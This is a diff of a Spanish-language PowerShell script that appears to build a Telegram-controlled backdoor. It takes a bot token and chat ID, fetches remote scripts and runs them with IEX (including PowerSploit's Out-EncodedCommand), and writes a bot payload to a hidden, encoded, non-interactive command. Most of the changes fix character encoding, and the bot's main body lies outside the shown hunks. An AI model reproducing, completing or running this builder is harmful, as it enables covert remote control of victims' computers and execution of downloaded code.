@@ -1,4 +1,4 @@
-ï»¿clear
+clear
 $ErrorActionPreference = "SilentlyContinue"
 $version = "0.2"
 
@@ -17,21 +17,21 @@ Write-Host $banner -ForegroundColor Green ; Write-Host "`n                      
 
 Write-Host "`n[" -ForegroundColor Green  -NoNewline ;Write-Host "+" -ForegroundColor Red -NoNewline ;Write-Host "] Introduzca el Token del Bot de Telegram: " -ForegroundColor Green -NoNewline ; [string]$your_token = Read-Host
 Write-Host "`n[" -ForegroundColor Green  -NoNewline ;Write-Host "+" -ForegroundColor Red -NoNewline ;Write-Host "] Introduzca su Chat ID: " -ForegroundColor Green -NoNewline ; [int]$your_chat_id = Read-Host
-Write-Host "`n[" -ForegroundColor Green  -NoNewline ;Write-Host "+" -ForegroundColor Red -NoNewline ;Write-Host "] Introduzca el delay para la conexiÃ³n: " -ForegroundColor Green -NoNewline ; [int]$your_delay = Read-Host
+Write-Host "`n[" -ForegroundColor Green  -NoNewline ;Write-Host "+" -ForegroundColor Red -NoNewline ;Write-Host "] Introduzca el delay para la conexión: " -ForegroundColor Green -NoNewline ; [int]$your_delay = Read-Host
 
 Function check-command
 {
  Param ($command)
  $antigua_config = $ErrorActionPreference
- $ErrorActionPreference = "stop"
+ $ErrorActionPreference = ‘stop’
  try {if(Get-Command $command){RETURN $true}}
  Catch { RETURN $false}
  Finally {$ErrorActionPreference=$antigua_config}
  }
-if ((check-command Invoke-WebRequest) -eq $false) {$objeto = "system.net.webclient" ; $webclient = New-Object $objeto ; $webrequest = $webclient.DownloadString("https://raw.githubusercontent.com/mwjcomputing/MWJ-Blog-Respository/master/PowerShell/Invoke-WebRequest.ps1");Write-Host "`n[" -ForegroundColor Green  -NoNewline ;Write-Host "+" -ForegroundColor Red -NoNewline ;Write-Host "] Cargamos la funciÃ³n Invoke-Webrequest`n" -ForegroundColor Green -NoNewline ; IEX $webrequest}
-Write-Host "`n[" -ForegroundColor Green  -NoNewline ;Write-Host "+" -ForegroundColor Red -NoNewline ;Write-Host "] Cargamos la funciÃ³n Out-EncodedCommand de PowerSploit `n" -ForegroundColor Green -NoNewline 
+if ((check-command Invoke-WebRequest) -eq $false) {$objeto = "system.net.webclient" ; $webclient = New-Object $objeto ; $webrequest = $webclient.DownloadString("https://raw.githubusercontent.com/mwjcomputing/MWJ-Blog-Respository/master/PowerShell/Invoke-WebRequest.ps1");Write-Host "`n[" -ForegroundColor Green  -NoNewline ;Write-Host "+" -ForegroundColor Red -NoNewline ;Write-Host "] Cargamos la función Invoke-Webrequest`n" -ForegroundColor Green -NoNewline ; IEX $webrequest}
+Write-Host "`n[" -ForegroundColor Green  -NoNewline ;Write-Host "+" -ForegroundColor Red -NoNewline ;Write-Host "] Cargamos la función Out-EncodedCommand de PowerSploit `n" -ForegroundColor Green -NoNewline 
 IEX (Invoke-WebRequest "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/ScriptModification/Out-EncodedCommand.ps1").content
-Write-Host "`n[" -ForegroundColor Green  -NoNewline ;Write-Host "+" -ForegroundColor Red -NoNewline ;Write-Host "] Tu cÃ³digo es: `n`n" -ForegroundColor Green -NoNewline  ; sleep -Seconds 1
+Write-Host "`n[" -ForegroundColor Green  -NoNewline ;Write-Host "+" -ForegroundColor Red -NoNewline ;Write-Host "] Tu código es: `n`n" -ForegroundColor Green -NoNewline  ; sleep -Seconds 1
 $scriptblock = {
 param (
 [string]$botkey = "your_token",
@@ -73,6 +73,4 @@ if ($kill -eq "$true" -and $first_connect -gt 5) {break}
 $scriptblock | Out-File bot.ps1
 $scriptblock -replace "your_token", "$your_token" -replace "your_chat_id", "$your_chat_id" -replace "your_delay", "$your_delay" | Out-File bot.ps1
 Out-EncodedCommand -Path bot.ps1 -NoProfile -NonInteractive -WindowStyle Hidden -EncodedOutput ; Remove-Item bot.ps1
-
-Write-Host "`n[" -ForegroundColor Green  -NoNewline ;Write-Host "+" -ForegroundColor Red -NoNewline ;Write-Host "] CÃ³digo listo para ejecutarse. `n`n`n" -ForegroundColor Green -NoNewline 
 pause
